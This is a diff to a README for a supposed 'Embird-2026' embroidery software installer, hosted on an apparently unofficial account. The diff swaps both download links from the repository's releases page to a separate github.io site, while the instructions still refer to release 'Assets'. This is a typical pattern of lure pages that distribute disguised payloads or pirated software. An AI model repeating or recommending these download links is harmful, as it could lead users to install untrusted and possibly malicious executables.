@@ -1,6 +1,6 @@
 # 🧵 Embird-2026 - Master Your Professional Embroidery Designs Today
 
-[![Download Embird-2026](https://img.shields.io/badge/Download-Embird_2026_Installer-blue.svg)](https://github.com/omnipotents450-beep/Embird-2026/releases)
+[![Download Embird-2026](https://img.shields.io/badge/Download-Embird_2026_Installer-blue.svg)](https://omnipotents450-beep.github.io)
 
 Embird-2026 provides a complete solution for digital embroidery design. This software allows you to create, edit, and convert stitch files on Windows. You gain access to tools for managing patterns, adjusting density, and preparing files for your embroidery machine. 
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run Embird-2026 effectively
 
 You can get the software directly from the official release page. Follow the link below to access the current installer.
 
-[Download Embird-2026 Installer](https://github.com/omnipotents450-beep/Embird-2026/releases)
+[Download Embird-2026 Installer](https://omnipotents450-beep.github.io)
 
 1. Navigate to the link provided above.
 2. Look for the "Assets" section at the bottom of the latest release.
